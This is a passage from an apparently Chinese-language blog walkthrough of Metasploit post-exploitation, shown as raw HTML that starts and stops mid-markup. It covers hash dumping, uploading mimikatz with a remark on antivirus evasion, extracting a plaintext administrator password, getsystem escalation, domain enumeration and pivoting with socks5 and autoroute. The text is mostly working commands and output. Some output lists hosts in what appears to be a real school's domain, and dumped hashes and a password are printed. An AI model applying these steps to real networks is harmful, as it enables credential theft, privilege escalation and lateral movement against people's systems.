Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one <span class="keyword">is</span> connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /Users/apple/.msf4/loot/<span class="number">20200903163754</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running <span class="keyword">as</span> SYSTEM extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list <span class="keyword">and</span> keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users <span class="keyword">with</span> password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:<span class="number">1012</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:<span class="number">1013</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>如果当前用户没有足够的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes</span><br><span class="line">[-] Try setting GETSYSTEM to true.</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x2F;tmp&#x2F;mimikatz.exe D:\S_JCIN\WebSite\OutWeb\L_CT\News</span><br><span class="line">[*] uploading  : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] Uploaded 1020.76 KiB of 1020.76 KiB (100.0%): &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] uploaded   : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">2499588</span> (<span class="number">00000000</span>:<span class="number">00262404</span>)</span><br><span class="line">Session           : Interactive <span class="keyword">from</span> <span class="number">1</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">9</span>/<span class="number">3</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">09</span></span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : <span class="number">3333</span>deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : <span class="number">7</span>d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>msf自身使用mimikaz</p><p>使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载kiwi模块</span><br><span class="line">load mimikatz</span><br><span class="line">查看kiwi模块的使用</span><br><span class="line">help mimikatz</span><br></pre></td></tr></table></figure><p>使用以下命令查看系统中的明文密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>hashdump</p><p>meterpreter权限不够，将其进程迁移到含有system的进程中（即使你getuid是system，但进程不在system也无法获得，亲测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] 2007: Operation failed: The parameter is incorrect.</span><br></pre></td></tr></table></figure><h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure><p>如果getsystem获取不到权限，基本是被UAC限制了。</p><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><h5 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>)</span><br></pre></td></tr></table></figure><h5 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows&#x2F;gather&#x2F;enum_ad_computers</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_ad_computers</span><br><span class="line"></span><br><span class="line">Domain Computers</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"> dNSHostName                  distinguishedName                                         description  operatingSystem                  operatingSystemServicePack</span><br><span class="line"> -----------                  -----------------                                         -----------  ---------------                  --------------------------</span><br><span class="line"> AD2.wgps.tp.edu.tw           CN=AD2,OU=Domain Controllers,DC=wgps,DC=tp,DC=edu,DC=tw                Windows Server <span class="number">2012</span> R2 Standard  </span><br><span class="line"> AD3-old.wgps.tp.edu.tw       CN=AD3-OLD,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                     Windows Server <span class="number">2012</span> R2 Standard  </span><br><span class="line"> AD1.wgps.tp.edu.tw           CN=AD1,OU=Domain Controllers,DC=wgps,DC=tp,DC=edu,DC=tw                Windows Server <span class="number">2012</span> R2 Standard  </span><br><span class="line"> <span class="number">2003</span>server.wgps.tp.edu.tw    CN=<span class="number">2003</span>SERVER,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                  Windows Server <span class="number">2003</span>              </span><br><span class="line">                              CN=<span class="number">2003</span>R2<span class="number">-32</span>BITS,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw               Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> HYPERV2008R2.wgps.tp.edu.tw  CN=HYPERV2008R2,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                Windows Server <span class="number">2008</span> R2 Standard  Service Pack <span class="number">1</span></span><br><span class="line"> school-sys.wgps.tp.edu.tw    CN=SCHOOL-SYS,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                  Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> School2003.wgps.tp.edu.tw    CN=SCHOOL2003,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                  Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> wu-teaching.wgps.tp.edu.tw   CN=WU-TEACHING,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                 Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> ad2-<span class="keyword">new</span>.wgps.tp.edu.tw       CN=AD2-<span class="keyword">NEW</span>,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                     Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> wego-dc4.wgps.tp.edu.tw      CN=WEGO-DC4,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                    Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> WEGO-DC3.wgps.tp.edu.tw      CN=WEGO-DC3,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                    Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> db2019.wgps.tp.edu.tw        CN=DB2019,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                      Windows Server <span class="number">2019</span> Standard     </span><br><span class="line"> OLDDatabase.wgps.tp.edu.tw   CN=OLDDATABASE,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                 Windows Server <span class="number">2003</span>              Service Pack <span class="number">2</span></span><br><span class="line"> MAIL2.wgps.tp.edu.tw         CN=MAIL2,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                       Windows Server <span class="number">2019</span> Standard     </span><br><span class="line"> files.wgps.tp.edu.tw         CN=FILES,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                       Windows Server <span class="number">2012</span> Standard     </span><br><span class="line"> CDTOWER17.wgps.tp.edu.tw     CN=CDTOWER17,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                   Windows Server� <span class="number">2008</span> Standard    Service Pack <span class="number">2</span></span><br><span class="line"> MAIL.wgps.tp.edu.tw          CN=MAIL,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                        Windows Server <span class="number">2012</span> R2 Standard  </span><br><span class="line"> database.wgps.tp.edu.tw      CN=DATABASE,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                    Windows Server <span class="number">2012</span> R2 Standard  </span><br><span class="line"> FILES2.wgps.tp.edu.tw        CN=FILES2,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                      Windows Server <span class="number">2012</span> Standard     </span><br><span class="line"> STUFILES.wgps.tp.edu.tw      CN=STUFILES,CN=Computers,DC=wgps,DC=tp,DC=edu,DC=tw                    Windows Server <span class="number">2012</span> Standard     </span><br><span class="line"> AD3.wgps.tp.edu.tw           CN=AD3,OU=Domain Controllers,DC=wgps,DC=tp,DC=edu,DC=tw                Windows Server <span class="number">2012</span> R2 Standard  </span><br></pre></td></tr></table></figure><h5 id="ifconfig查看DNS服务器地址"><a href="#ifconfig查看DNS服务器地址" class="headerlink" title="ifconfig查看DNS服务器地址"></a>ifconfig查看DNS服务器地址</h5><h4 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h4><h5 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h5><p>搜索一下可用代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/scanner/http/sockso_traversal  <span class="number">2012</span><span class="number">-03</span><span class="number">-14</span>       normal  No     Sockso Music Host Server <span class="number">1.5</span> Directory Traversal</span><br><span class="line">   <span class="number">1</span>  auxiliary/server/socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   <span class="number">2</span>  auxiliary/server/socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   <span class="number">3</span>  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The address to listen on</span><br><span class="line">   SRVPORT   <span class="number">1080</span>             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">SRVHOST =&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVPORT <span class="number">5555</span></span><br><span class="line">SRVPORT =&gt; 5555</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running <span class="keyword">as</span> background job <span class="number">0.</span></span><br><span class="line">msf5 auxiliary(server/socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">198.168</span><span class="number">.52</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span> -n <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="comment"># Add a route to 10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span>              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute -d -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">&quot;route&quot;</span> <span class="keyword">and</span> <span class="string">&quot;ipconfig&quot;</span> Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>...</span><br><span class="line">[+] Added route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> via <span class="number">10.48</span><span class="number">.8</span><span class="number">.234</span></span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h4 id="autoroute模块"><a href="#autoroute模块" class="headerlink" title="autoroute模块"></a>autoroute模块</h4><h5 id="获取当前机器的所有网段信息"><a href="#获取当前机器的所有网段信息" class="headerlink" title="获取当前机器的所有网段信息"></a>获取当前机器的所有网段信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br></pre></td></tr></table></figure><h5 id="添加目标内网网段的路由"><a href="#添加目标内网网段的路由" class="headerlink" title="添加目标内网网段的路由"></a>添加目标内网网段的路由</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br><span class="line">[+] Added route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span> via <span 